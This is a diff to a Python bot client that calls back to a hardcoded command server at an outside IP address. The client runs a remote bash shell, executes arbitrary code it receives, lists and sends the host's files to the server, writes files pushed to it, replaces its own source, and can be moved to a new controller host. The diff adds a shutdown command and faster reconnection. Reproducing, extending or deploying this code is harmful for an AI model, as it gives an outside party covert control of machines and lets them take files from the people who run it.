@@ -22,6 +22,7 @@ except:
 __version__ = "1.1"
 
 HOST = '50.159.66.236'
+#HOST = 'localhost'
 PORT = 1708
 HOSTINFOFILE = '.host'
 IDFILE = '.id'
@@ -42,10 +43,12 @@ FILE_CLOSE = 'fclose'
 FILE_FILENAME = 'fname'
 CLIENT_STREAM = 'cstream'
 CLIENT_CLOSE = 'cclose'
+SHUTDOWN = 'shutdown'
 
 PRINT_BUFFER = StringIO()
 
 RUNNING = True
+RESTART = True
 normstdout = sys.stdout
 normstderr = sys.stderr
 
@@ -159,6 +162,7 @@ class AppendDataLock:
     def empty(self):
         with self.lock:
             return len(self.dat) == 0
+
 
 class ByteLockBundler:
     PACKET_MAX_DAT = 2**13
@@ -321,6 +325,10 @@ class PayloadLib:
         :param bytelock: bytelock to use for forwarding files
         '''
         self.bytelock = bytelock
+        self.fileloc = __file__
+        self.pythonpath = sys.executable
+        self.requested_shutdown = False
+        self.user = getpass.getuser()
 
     def upload(self, filename,blocking=False):
         filename = os.path.abspath(os.path.expanduser(filename))
@@ -352,7 +360,11 @@ class WriterWrapper:
         self.func = writefunc
 
     def write(self, wstr):
-        self.func(wstr)
+        try:
+            for f in self.func:
+                f(wstr)
+        except TypeError:
+            self.func(wstr)
 
 
 # Scripts
@@ -383,7 +395,7 @@ def main(host=HOST, port=PORT, botid=None):
                 sys.stderr.write("[!] "+str(e))
         if RUNNING:
             # Try again in a minute
-            time.sleep(60)
+            time.sleep(10)
 
 
 def serve(sock):
@@ -396,8 +408,8 @@ def serve(sock):
 
     bytelock = ByteLockBundler(sock)
     payloadlib = PayloadLib(bytelock)
-    sys.stdout = WriterWrapper(lambda s: bytelock.writePrintstr(s))
-    sys.stderr = WriterWrapper(lambda s: bytelock.writeErrstr(s))
+    sys.stdout = WriterWrapper([lambda s: bytelock.writePrintstr(s),sys.stdout.write])
+    sys.stderr = WriterWrapper([lambda s: bytelock.writeErrstr(s),sys.stderr.write])
 
     executable = "bash"
     if os.name == 'nt':
@@ -438,101 +450,111 @@ def serve(sock):
     def pollSock():
         '''Check socket output and respond to queries'''
         global RUNNING
+        global RESTART
         global proc
         fileobjs = {}
         clientobj = None
         while RUNNING:
-            recvbytes = sock.format_recv()
-            recvjson = json.loads(recvbytes.decode('UTF-8'))
+            try:
+                recvbytes = sock.format_recv()
+                recvjson = json.loads(recvbytes.decode('UTF-8'))
 
-            # Special LS command
-            if LS_JSON in recvjson:
-                filedict = {}
-                filepath = os.path.abspath(os.path.expanduser(recvjson[LS_JSON]))
-                if os.path.isdir(filepath):
-                    try:
-                        # Throws exception when permission denied on folder
-                        ls = os.listdir(filepath)
-                        for hostfile in (os.path.join(filepath, f) for f in ls):
-                            try:
-                                retstat = os.stat(hostfile)
-                                retval = (os.path.isdir(hostfile), retstat.st_mode, retstat.st_size)
-                                filedict[hostfile] = retval
-                            except OSError:
-                                # This can happen if you have really weird files, trust me
-                                pass
-                    except:
-                        pass
+                # Special LS command
+                if LS_JSON in recvjson:
+                    filedict = {}
+                    filepath = os.path.abspath(os.path.expanduser(recvjson[LS_JSON]))
+                    if os.path.isdir(filepath):
+                        try:
+                            # Throws exception when permission denied on folder
+                            ls = os.listdir(filepath)
+                            for hostfile in (os.path.join(filepath, f) for f in ls):
+                                try:
+                                    retstat = os.stat(hostfile)
+                                    retval = (os.path.isdir(hostfile), retstat.st_mode, retstat.st_size)
+                                    filedict[hostfile] = retval
+                                except OSError:
+                                    # This can happen if you have really weird files, trust me
+                                    pass
+                        except:
+                            pass
 
-                specentry = json.dumps((filepath, filedict)).encode('UTF-8')
-                bytelock.writeSpecial("ls",specentry)
-            if KILL_PROC in recvjson:
-                with proclock:
-                    proc.kill()
-                    proc = subprocess.Popen([executable],
-                                            stdin=subprocess.PIPE,
-                                            stdout=subprocess.PIPE,
-                                            stderr=subprocess.PIPE,
-                                            cwd=os.path.expanduser("~"))
-            if HOST_TRANSFER in recvjson:
-                hostaddr = recvjson[HOST_TRANSFER][0]
-                hostport = int(recvjson[HOST_TRANSFER][1])
-                with open(HOSTINFOFILE,"w") as hostfile:
-                    hostfile.write(hostaddr + "\n")
-                    hostfile.write(str(hostport))
-                # Restart
+                    specentry = json.dumps((filepath, filedict)).encode('UTF-8')
+                    bytelock.writeSpecial("ls",specentry)
+                if KILL_PROC in recvjson:
+                    with proclock:
+                        proc.kill()
+                        proc = subprocess.Popen([executable],
+                                                stdin=subprocess.PIPE,
+                                                stdout=subprocess.PIPE,
+                                                stderr=subprocess.PIPE,
+                                                cwd=os.path.expanduser("~"))
+                if HOST_TRANSFER in recvjson:
+                    hostaddr = recvjson[HOST_TRANSFER][0]
+                    hostport = int(recvjson[HOST_TRANSFER][1])
+                    with open(HOSTINFOFILE,"w") as hostfile:
+                        hostfile.write(hostaddr + "\n")
+                        hostfile.write(str(hostport))
+                    # Restart
+                    RUNNING = False
+                if ASSIGN_ID in recvjson:
+                    id = recvjson[ASSIGN_ID]
+                    with open(IDFILE,"w") as idfile:
+                        idfile.write(id)
+                # Standard evaluation
+                if STDIN in recvjson:
+                    with proclock:
+                        proc.stdin.write(recvjson[STDIN].encode('UTF-8'))
+                        proc.stdin.flush()
+                if CMD in recvjson:
+                    cmd_str = recvjson[CMD]
+                    cmd_arr = cmd_str.split(" ")
+                    newproc = subprocess.Popen(cmd_arr)
+                if EVAL in recvjson:
+                    def execfunc():
+                        try:
+                            exec(recvjson[EVAL]) in {'payloadlib':payloadlib}
+                        except Exception as e:
+                            tb = traceback.format_exc()
+                            sys.stderr.write(tb)
+                    t = threading.Thread(target=execfunc)
+                    t.start()
+
+                # It is important that FILE_CLOSE comes *after* FILE_FILENAME
+                if FILE_FILENAME in recvjson:
+                    filename = recvjson[FILE_FILENAME]
+                    if filename not in fileobjs:
+                        fileobjs[filename] = open(filename,'wb')
+                    fobj = fileobjs[filename]
+                    bstr = recvjson[FILE_STREAM]
+                    b64bytes = base64.b64decode(bstr)
+                    fobj.write(b64bytes)
+                if FILE_CLOSE in recvjson:
+                    filename = recvjson[FILE_CLOSE]
+                    if filename in fileobjs:
+                        fileobjs[filename].close()
+                        fileobjs.pop(filename)
+
+                # It is important that CLIENT_CLOSE comes *after* CLIENT_STREAM
+                if CLIENT_STREAM in recvjson:
+                    if clientobj is None:
+                        clientobj = open(os.path.abspath(__file__),"wb")
+                    bstr = recvjson[CLIENT_STREAM]
+                    clientobj.write(bstr.encode('UTF-8'))
+                if CLIENT_CLOSE in recvjson and clientobj is not None:
+                    clientobj.close()
+                    RUNNING = False
+
+                if FILE_DOWNLOAD in recvjson:
+                    filename = recvjson[FILE_DOWNLOAD]
+                    payloadlib.upload(filename)
+
+                if SHUTDOWN in recvjson:
+                    RUNNING = False
+                    RESTART = False
+
+            except Exception as e:
+                sys.stderr.write("[!] " + str(e))
                 RUNNING = False
-            if ASSIGN_ID in recvjson:
-                id = recvjson[ASSIGN_ID]
-                with open(IDFILE,"w") as idfile:
-                    idfile.write(id)
-            # Standard evaluation
-            if STDIN in recvjson:
-                with proclock:
-                    proc.stdin.write(recvjson[STDIN].encode('UTF-8'))
-                    proc.stdin.flush()
-            if CMD in recvjson:
-                cmd_str = recvjson[CMD]
-                cmd_arr = cmd_str.split(" ")
-                newproc = subprocess.Popen(cmd_arr)
-            if EVAL in recvjson:
-                def execfunc():
-                    try:
-                        exec(recvjson[EVAL]) in {'payloadlib':payloadlib}
-                    except Exception as e:
-                        tb = traceback.format_exc()
-                        sys.stderr.write(tb)
-                t = threading.Thread(target=execfunc)
-                t.start()
-
-            # It is important that FILE_CLOSE comes *after* FILE_FILENAME
-            if FILE_FILENAME in recvjson:
-                filename = recvjson[FILE_FILENAME]
-                if filename not in fileobjs:
-                    fileobjs[filename] = open(filename,'wb')
-                fobj = fileobjs[filename]
-                bstr = recvjson[FILE_STREAM]
-                b64bytes = base64.b64decode(bstr)
-                fobj.write(b64bytes)
-            if FILE_CLOSE in recvjson:
-                filename = recvjson[FILE_CLOSE]
-                if filename in fileobjs:
-                    fileobjs[filename].close()
-                    fileobjs.pop(filename)
-
-            # It is important that CLIENT_CLOSE comes *after* CLIENT_STREAM
-            if CLIENT_STREAM in recvjson:
-                if clientobj is None:
-                    clientobj = open(os.path.abspath(__file__),"wb")
-                bstr = recvjson[CLIENT_STREAM]
-                clientobj.write(bstr.encode('UTF-8'))
-            if CLIENT_CLOSE in recvjson and clientobj is not None:
-                clientobj.close()
-                RUNNING = False
-
-            if FILE_DOWNLOAD in recvjson:
-                filename = recvjson[FILE_DOWNLOAD]
-                payloadlib.upload(filename)
 
             if not RUNNING:
                 with proclock:
@@ -700,5 +722,5 @@ if __name__ == "__main__":
             with open(IDFILE,"r") as f:
                 bid = f.read()
         main(hostaddr,hostport,bid)
-        if not RUNNING:
+        if (not RUNNING):
             os.execv(sys.executable, [sys.executable] + sys.argv)
